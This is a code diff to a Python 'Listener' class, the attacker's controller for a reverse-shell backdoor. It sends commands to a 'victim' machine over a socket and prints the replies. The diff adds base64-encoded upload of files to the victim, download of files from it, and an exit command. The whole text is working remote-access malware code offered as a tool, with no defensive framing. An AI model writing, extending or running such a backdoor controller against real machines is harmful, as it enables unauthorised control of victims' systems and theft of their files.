@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 import socket
 import json
+import base64
+
 class Listener:
     def __init__(self, ip, p):
         l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -16,7 +18,7 @@ class Listener:
         self.conn.send(pack_data)
 
     def recv_data(self):
-        pack_data = ''
+        pack_data = b''
         while True:
             try:
                 pack_data += self.conn.recv(1024)
@@ -27,7 +29,19 @@ class Listener:
 
     def execute_at_victim(self, command):
         self.send_data(command)
+        if command[0] == "exit":
+            self.conn.close()
+            exit()
         return self.recv_data()
+
+    def read_file(self, name):
+        with open(name, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def write_file(self, name, content):
+         with open(name, "wb") as file:
+             file.write(base64.b64decode(content))
+             return "[+] Download Successful!"
 
     def start(self):
         while True:
@@ -35,7 +49,13 @@ class Listener:
                 command = raw_input(">>")
             except:
                 command = input(">>")
+            command = command.split(" ")
+            if command[0] == "upload":
+                content = self.read_file(command[1])
+                command.append(content)
             output = self.execute_at_victim(command)
+            if command[0] == "download":
+                output = self.write_file(command[1], output)
             print(output)
 
 
